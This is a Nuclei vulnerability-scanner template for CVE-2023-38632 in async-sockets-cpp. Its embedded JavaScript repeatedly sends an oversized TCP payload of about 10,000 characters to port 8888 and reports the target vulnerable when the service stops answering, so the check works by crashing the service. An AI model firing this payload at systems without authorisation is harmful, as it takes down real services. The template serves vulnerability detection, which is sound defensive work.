id: CVE-2023-38632

info:
  name: CVE-2023-38632
  author: dwisiswant0
  severity: critical
  description: |
    async-sockets-cpp through 0.3.1 has a stack-based buffer overflow
    in tcpsocket.hpp when processing malformed TCP packets.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2023-38632
    - https://github.com/eminfedar/async-sockets-cpp/issues/31

variables:
  buffer: '{{repeat(to_upper(rand_text_alpha(1)), rand_int(10000, 10999))}}'

javascript:
  - pre-condition: isPortOpen(host, port, 10);
    code: |
      const net = require('nuclei/net');
      let ok = false,
          err = false,
          vuln = false;
      for (let i = 0; i < 10; i++) {
        try {
          let conn = net.Open('tcp', `${host}:${port}`);
          conn.Send(payload);
          let data = conn.RecvString(3);
          ok = data === "OK!";
          conn.Close();
        } catch(e) {
          err = /connection (refused|reset by peer)/.test(e.value);
          if (err && i > 0) break;
        }
      }
      vuln = ok && err;

    args:
      host: "{{Host}}"
      port: "8888"
      payload: "{{buffer}}"

    matchers:
      - type: dsl
        dsl:
          - "success && response" # shorthand for 'success == true && response == true'
        condition: and
